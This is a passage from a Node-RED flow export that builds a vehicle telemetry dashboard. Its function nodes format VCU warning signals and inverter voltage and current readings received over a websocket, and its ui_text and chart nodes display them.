VCU_motorCoolantFlowRateWarning.payload = VCU_motorCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcOverVoltWarning =\n{\n    topic: \"MC Over Volt Warning\",\n    payload: msg.payload.VCU_mcOverVoltWarning\n}\ntry {\n    VCU_mcOverVoltWarning.payload = VCU_mcOverVoltWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcOverCurrentWarning =\n{\n    topic: \"MC Over Current Warning\",\n    payload: msg.payload.VCU_mcOverCurrentWarning\n}\ntry {\n    VCU_mcOverCurrentWarning.payload = VCU_mcOverCurrentWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempOutWarning =\n{\n    topic: \"MC Coolant Temp Out Warning\",\n    payload: msg.payload.VCU_mcCoolantTempOutWarning\n}\ntry {\n    VCU_mcCoolantTempOutWarning.payload = VCU_mcCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantTempInWarning =\n{\n    topic: \"MC Coolant Temp In Warning\",\n    payload: msg.payload.VCU_mcCoolantTempInWarning\n}\ntry {\n    VCU_mcCoolantTempInWarning.payload = VCU_mcCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressOutWarning =\n{\n    topic: \"MC Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_mcCoolantPressOutWarning\n}\ntry {\n    VCU_mcCoolantPressOutWarning.payload = VCU_mcCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantPressInWarning =\n{\n    topic: \"MC Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_mcCoolantPressInWarning\n}\ntry {\n    VCU_mcCoolantPressInWarning.payload = VCU_mcCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCoolantFlowRateWarning =\n{\n    topic: \"MC Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_mcCoolantFlowRateWarning\n}\ntry {\n    VCU_mcCoolantFlowRateWarning.payload = VCU_mcCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_mcCANTimeoutWarning =\n{\n    topic: \"MC CAN Timeout Warning\",\n    payload: msg.payload.VCU_mcCANTimeoutWarning\n}\ntry {\n    VCU_mcCANTimeoutWarning.payload = VCU_mcCANTimeoutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_batteryUnderVoltWarning =\n{\n    topic: \"Battery Under Volt Warning\",\n    payload: msg.payload.VCU_batteryUnderVoltWarning\n}\ntry {\n    VCU_batteryUnderVoltWarning.payload = VCU_batteryUnderVoltWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuUnderVoltWarning =\n{\n    topic: \"Accumulater Under Volt Warning\",\n    payload: msg.payload.VCU_accuUnderVoltWarning\n}\ntry {\n    VCU_accuUnderVoltWarning.payload = VCU_accuUnderVoltWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuOverVoltWarning =\n{\n    topic: \"Accumulator Over Volt Warning\",\n    payload: msg.payload.VCU_accuOverVoltWarning\n}\ntry {\n    VCU_accuOverVoltWarning.payload = VCU_accuOverVoltWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuOverCurrentWarning =\n{\n    topic: \"Accumulator Over Current Warning\",\n    payload: msg.payload.VCU_accuOverCurrentWarning\n}\ntry {\n    VCU_accuOverCurrentWarning.payload = VCU_accuOverCurrentWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accumulatorTempWarning =\n{\n    topic: \"Accumulator Temp Warning\",\n    payload: msg.payload.VCU_accumulatorTempWarning\n}\ntry {\n    VCU_accumulatorTempWarning.payload = VCU_accumulatorTempWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuIMDLightWarning =\n{\n    topic: \"Accumulator IMD Light Warning\",\n    payload: msg.payload.VCU_accuIMDLightWarning\n}\ntry {\n    VCU_accuIMDLightWarning.payload = VCU_accuIMDLightWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuHVILWarning =\n{\n    topic: \"Accumulator HVIL Warning\",\n    payload: msg.payload.VCU_accuHVILWarning\n}\ntry {\n    VCU_accuHVILWarning.payload = VCU_accuHVILWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempOutWarning =\n{\n    topic: \"Accumulator Coolant Temp Out Warning\",\n    payload: msg.payload.VCU_accuCoolantTempOutWarning\n}\ntry {\n    VCU_accuCoolantTempOutWarning.payload = VCU_accuCoolantTempOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantTempInWarning =\n{\n    topic: \"Accumulator Coolant Temp In Warning\",\n    payload: msg.payload.VCU_accuCoolantTempInWarning\n}\ntry {\n    VCU_accuCoolantTempInWarning.payload = VCU_accuCoolantTempInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressOutWarning =\n{\n    topic: \"Accumulator Coolant Pressure Out Warning\",\n    payload: msg.payload.VCU_accuCoolantPressOutWarning\n}\ntry {\n    VCU_accuCoolantPressOutWarning.payload = VCU_accuCoolantPressOutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantPressInWarning =\n{\n    topic: \"Accumulator Coolant Pressure In Warning\",\n    payload: msg.payload.VCU_accuCoolantPressInWarning\n}\ntry {\n    VCU_accuCoolantPressInWarning.payload = VCU_accuCoolantPressInWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCoolantFlowRateWarning =\n{\n    topic: \"Accumulator Coolant Flow Rate Warning\",\n    payload: msg.payload.VCU_accuCoolantFlowRateWarning\n}\ntry {\n    VCU_accuCoolantFlowRateWarning.payload = VCU_accuCoolantFlowRateWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar VCU_accuCANTimeoutWarning =\n{\n    topic: \"Accumulator CAN Timeout Warning\",\n    payload: msg.payload.VCU_accuCANTimeoutWarning\n}\ntry {\n    VCU_accuCANTimeoutWarning.payload = VCU_accuCANTimeoutWarning.payload.toFixed(sigFigs)\n} catch { }\n\nvar Latency =\n{\n    topic: \"Latency (s)\",\n    payload: msg.payload.Latency\n}\ntry {\n    Latency.payload = Latency.payload.toFixed(sigFigs)\n} catch { }\n\nvar Total_Latency =\n{\n    topic: \"Total Latency (s)\",\n    payload: (timestamp - msg.payload.Arduino_Time)\n}\ntry {\n    Total_Latency.payload = Total_Latency.payload / 1000\n    Total_Latency.payload = Total_Latency.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    VCU_warningSource,\n    VCU_tsOverPowerWarning,\n    VCU_radCoolantTempOutWarning,\n    VCU_radCoolantTempInWarning,\n    VCU_radCoolantPressOutWarning,\n    VCU_radCoolantPressInWarning, \n    VCU_radCoolantFlowRateWarning,\n    VCU_pedalPlausFaultWarning,\n    VCU_motorTorqueLimitWarning,\n    VCU_motorSpeedLimitWarning,\n    VCU_motorOverVoltWarning,\n    VCU_motorOverSpeedWarning,\n    VCU_motorOverCurrentWarning,\n    VCU_motorCoolantTempOutWarning,\n    VCU_motorCoolantTempInWarning,\n    VCU_motorCoolantPressOutWarning,\n    VCU_motorCoolantPressInWarning,\n    VCU_motorCoolantFlowRateWarning,\n    VCU_mcOverVoltWarning,\n    VCU_mcOverCurrentWarning,\n    VCU_mcCoolantTempOutWarning,\n    VCU_mcCoolantTempInWarning,\n    VCU_mcCoolantPressOutWarning,\n    VCU_mcCoolantPressInWarning,\n    VCU_mcCoolantFlowRateWarning,\n    VCU_mcCANTimeoutWarning,\n    VCU_batteryUnderVoltWarning,\n    VCU_accuUnderVoltWarning,\n    VCU_accuOverVoltWarning,\n    VCU_accuOverCurrentWarning,\n    VCU_accumulatorTempWarning,\n    VCU_accuIMDLightWarning,\n    VCU_accuHVILWarning,\n    VCU_accuCoolantTempOutWarning,\n    VCU_accuCoolantTempInWarning,\n    VCU_accuCoolantPressOutWarning,\n    VCU_accuCoolantPressInWarning,\n    VCU_accuCoolantFlowRateWarning,\n    VCU_accuCANTimeoutWarning,\n    Latency,\n    Total_Latency\n];\n",
        "outputs": 41,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 730,
        "y": 440,
        "wires": [
            [
                "48eed2cffc947049"
            ],
            [
                "df141f902ce2a5d7"
            ],
            [
                "623e97df6f1cfcea"
            ],
            [
                "1b9fd683b4b75947"
            ],
            [
                "ea35b1a9c81a92ee"
            ],
            [
                "32b4cbda3eb6ab20"
            ],
            [
                "19ea3342d902f269"
            ],
            [
                "4d4faceae1998156"
            ],
            [
                "64957f2aaeb6c85c"
            ],
            [
                "4fd7a26a8ea2c882"
            ],
            [
                "a3bb314a422cf329"
            ],
            [
                "86eb2428c09832f1"
            ],
            [
                "d9fa8d7f75bb12bc"
            ],
            [
                "6dca24899a19a0c1"
            ],
            [
                "c1568e4013f2c9a3"
            ],
            [
                "f1176cc4bf76f9f5"
            ],
            [
                "261aaa2dcdba9a19"
            ],
            [
                "b49de7c5337c3658"
            ],
            [
                "afb918722b37a2e1"
            ],
            [
                "c8a271bd79cfc4c6"
            ],
            [
                "2fa9cfadbdf090f2"
            ],
            [
                "8527b5f246fcc651"
            ],
            [
                "b149d1515a5c019a"
            ],
            [
                "667cee4663350856"
            ],
            [
                "9b0f395b5bed5b08"
            ],
            [
                "3b881e67d838485f"
            ],
            [
                "6ebd2c6de7c6f1ab"
            ],
            [
                "2fc279252b8aa240"
            ],
            [
                "2d3112f34c289063"
            ],
            [
                "2f5221f9587e8f8f"
            ],
            [
                "90b2bd21d66a9049"
            ],
            [
                "c3ebf74c3fcedc86"
            ],
            [
                "738ef3d53281f331"
            ],
            [
                "9a3d77a9d70cbacd"
            ],
            [
                "303d1fcf1961740a"
            ],
            [
                "eede4c413d62f21c"
            ],
            [
                "b5e7c87a2868bbe9"
            ],
            [
                "4c607f7daa0b5a86"
            ],
            [
                "9008679f055f3cb4"
            ],
            [
                "d132cb66970d9724"
            ],
            [
                "27e39aa64b25e844"
            ]
        ],
        "outputLabels": [
            "VCU_warningSource",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            "",
            ""
        ]
    },
    {
        "id": "48eed2cffc947049",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "04e08631e84058db",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Warning Source",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1040,
        "y": 40,
        "wires": []
    },
    {
        "id": "1b9fd683b4b75947",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b4bef3241514c07",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 160,
        "wires": []
    },
    {
        "id": "df141f902ce2a5d7",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b5ca029a6d0ac27",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Over Power Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1060,
        "y": 80,
        "wires": []
    },
    {
        "id": "623e97df6f1cfcea",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "9e9852155f05fbbc",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "Radiant Coolant Temp Out Warning",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1100,
        "y": 120,
        "wires": []
    },
    {
        "id": "ea35b1a9c81a92ee",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c965a10c47bab615",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 200,
        "wires": []
    },
    {
        "id": "32b4cbda3eb6ab20",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "04e08631e84058db",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 240,
        "wires": []
    },
    {
        "id": "19ea3342d902f269",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b5ca029a6d0ac27",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 280,
        "wires": []
    },
    {
        "id": "4d4faceae1998156",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "9e9852155f05fbbc",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 320,
        "wires": []
    },
    {
        "id": "64957f2aaeb6c85c",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b4bef3241514c07",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 360,
        "wires": []
    },
    {
        "id": "4fd7a26a8ea2c882",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c965a10c47bab615",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 400,
        "wires": []
    },
    {
        "id": "a3bb314a422cf329",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b4bef3241514c07",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 440,
        "wires": []
    },
    {
        "id": "86eb2428c09832f1",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "14f3e47aed581013",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 480,
        "wires": []
    },
    {
        "id": "d9fa8d7f75bb12bc",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "14f3e47aed581013",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 520,
        "wires": []
    },
    {
        "id": "6dca24899a19a0c1",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "04e08631e84058db",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 560,
        "wires": []
    },
    {
        "id": "c1568e4013f2c9a3",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b5ca029a6d0ac27",
        "order": 6,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 600,
        "wires": []
    },
    {
        "id": "f1176cc4bf76f9f5",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "9e9852155f05fbbc",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 640,
        "wires": []
    },
    {
        "id": "261aaa2dcdba9a19",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b4bef3241514c07",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 680,
        "wires": []
    },
    {
        "id": "b49de7c5337c3658",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "14f3e47aed581013",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 720,
        "wires": []
    },
    {
        "id": "afb918722b37a2e1",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c50189d88cd6068b",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 760,
        "wires": []
    },
    {
        "id": "c8a271bd79cfc4c6",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c965a10c47bab615",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 800,
        "wires": []
    },
    {
        "id": "2fa9cfadbdf090f2",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "14f3e47aed581013",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 840,
        "wires": []
    },
    {
        "id": "8527b5f246fcc651",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b4bef3241514c07",
        "order": 2,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 880,
        "wires": []
    },
    {
        "id": "b149d1515a5c019a",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b4bef3241514c07",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 920,
        "wires": []
    },
    {
        "id": "667cee4663350856",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "9e9852155f05fbbc",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 960,
        "wires": []
    },
    {
        "id": "9b0f395b5bed5b08",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b5ca029a6d0ac27",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1040,
        "wires": []
    },
    {
        "id": "3b881e67d838485f",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c50189d88cd6068b",
        "order": 1,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1080,
        "wires": []
    },
    {
        "id": "6ebd2c6de7c6f1ab",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c50189d88cd6068b",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1120,
        "wires": []
    },
    {
        "id": "2fc279252b8aa240",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "04e08631e84058db",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1160,
        "wires": []
    },
    {
        "id": "2d3112f34c289063",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c965a10c47bab615",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1200,
        "wires": []
    },
    {
        "id": "2f5221f9587e8f8f",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c965a10c47bab615",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1240,
        "wires": []
    },
    {
        "id": "90b2bd21d66a9049",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c50189d88cd6068b",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1280,
        "wires": []
    },
    {
        "id": "c3ebf74c3fcedc86",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "9e9852155f05fbbc",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1320,
        "wires": []
    },
    {
        "id": "738ef3d53281f331",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b5ca029a6d0ac27",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1360,
        "wires": []
    },
    {
        "id": "9a3d77a9d70cbacd",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "04e08631e84058db",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1010,
        "y": 1400,
        "wires": []
    },
    {
        "id": "303d1fcf1961740a",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "14f3e47aed581013",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 860,
        "wires": []
    },
    {
        "id": "eede4c413d62f21c",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c50189d88cd6068b",
        "order": 5,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 900,
        "wires": []
    },
    {
        "id": "b5e7c87a2868bbe9",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "04e08631e84058db",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 940,
        "wires": []
    },
    {
        "id": "4c607f7daa0b5a86",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "1b5ca029a6d0ac27",
        "order": 4,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 980,
        "wires": []
    },
    {
        "id": "9008679f055f3cb4",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "9e9852155f05fbbc",
        "order": 3,
        "width": 4,
        "height": 2,
        "name": "",
        "label": "{{msg.topic}}",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 1020,
        "wires": []
    },
    {
        "id": "d132cb66970d9724",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "34cf3565746645b2",
        "order": 1,
        "width": 5,
        "height": 1,
        "name": "",
        "label": "Server Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1050,
        "y": 1440,
        "wires": []
    },
    {
        "id": "27e39aa64b25e844",
        "type": "ui_text",
        "z": "149f680d508ad4ad",
        "group": "c6083e7c4b981093",
        "order": 1,
        "width": 5,
        "height": 1,
        "name": "",
        "label": "Total Latency (s):",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 1050,
        "y": 1480,
        "wires": []
    },
    {
        "id": "3d73adf75b30a6fb",
        "type": "json",
        "z": "149f680d508ad4ad",
        "name": "",
        "property": "payload",
        "action": "obj",
        "pretty": false,
        "x": 470,
        "y": 280,
        "wires": [
            [
                "cc1a672b0390d648"
            ]
        ]
    },
    {
        "id": "ddbdd52758154491",
        "type": "websocket in",
        "z": "149f680d508ad4ad",
        "name": "",
        "server": "31337e6096350fd4",
        "client": "",
        "x": 270,
        "y": 280,
        "wires": [
            [
                "3d73adf75b30a6fb"
            ]
        ]
    },
    {
        "id": "ee0b250d87f6e5dc",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "0e1238d7f55a6974",
        "order": 3,
        "width": 8,
        "height": 6,
        "label": "Reference Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 20,
        "wires": [
            []
        ]
    },
    {
        "id": "462c713e2f67e9a5",
        "type": "function",
        "z": "4a2f2f6c3794d699",
        "name": "MC Code",
        "func": "var sigFigs = 2\nconst currentDate = new Date();\nvar timestamp = currentDate.getTime();\n\nvar INV_Ref_Voltage_12_0 =\n{\n    topic: \"INV REF Voltage 12.0 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_12_0\n}\ntry {\n    INV_Ref_Voltage_12_0.payload = INV_Ref_Voltage_12_0.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_5_0 =\n{\n    topic: \"INV REF Voltage 5.0 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_5_0\n}\ntry {\n    INV_Ref_Voltage_5_0.payload = INV_Ref_Voltage_5_0.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Ref_Voltage_2_5 =\n{\n    topic: \"INV REF Voltage 2.5 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_2_5\n}\ntry {\n    INV_Ref_Voltage_2_5.payload = INV_Ref_Voltage_2_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_1_5 =\n{\n    topic: \"INV REF Voltage 1.5 (V)\",\n    payload: msg.payload.INV_Ref_Voltage_1_5\n}\ntry {\n    INV_Ref_Voltage_1_5.payload = INV_Ref_Voltage_1_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Iq =\n{\n    topic: \"INV Iq (A)\",\n    payload: msg.payload.INV_Iq\n}\ntry {\n    INV_Iq.payload = INV_Iq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Id =\n{\n    topic: \"INV Id (A)\",\n    payload: msg.payload.INV_Id\n}\ntry {\n    INV_Id.payload = INV_Id.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vq_ff =\n{\n    topic: \"INV Vq FF (V)\",\n    payload: msg.payload.INV_Vq_ff\n}\ntry {\n    INV_Vq_ff.payload = INV_Vq_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vd_ff =\n{\n    topic: \"INV Vd FF (V)\",\n    payload: msg.payload.INV_Vd_ff\n}\ntry {\n    INV_Vd_ff.payload = INV_Vd_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VBC_Vq_Voltage =\n{\n    topic: \"INV Vbc-Vq Voltage (V)\",\n    payload: msg.payload.INV_VBC_Vq_Voltage\n}\ntry {\n    INV_VBC_Vq_Voltage.payload = INV_VBC_Vq_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VAB_Vd_Voltage =\n{\n    topic: \"INV Vab-Vd Voltage (V)\",\n    payload: msg.payload.INV_VAB_Vd_Voltage\n}\ntry {\n    INV_VAB_Vd_Voltage.payload = INV_VAB_Vd_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Output_Voltage =\n{\n    topic: \"INV Output Voltage (V)\",\n    payload: msg.payload.INV_Output_Voltage\n}\ntry {\n    INV_Output_Voltage.payload = INV_Output_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Voltage =\n{\n    topic: \"INV DC Bus Voltage (V)\",\n    payload: msg.payload.INV_DC_Bus_Voltage\n}\ntry {\n    INV_DC_Bus_Voltage.payload = INV_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Current =\n{\n    topic: \"INV DC Bus Current (A)\",\n    payload: msg.payload.INV_DC_Bus_Current\n}\ntry {\n    INV_DC_Bus_Current.payload = INV_DC_Bus_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_C_Current =\n{\n    topic: \"INV Phase C Current 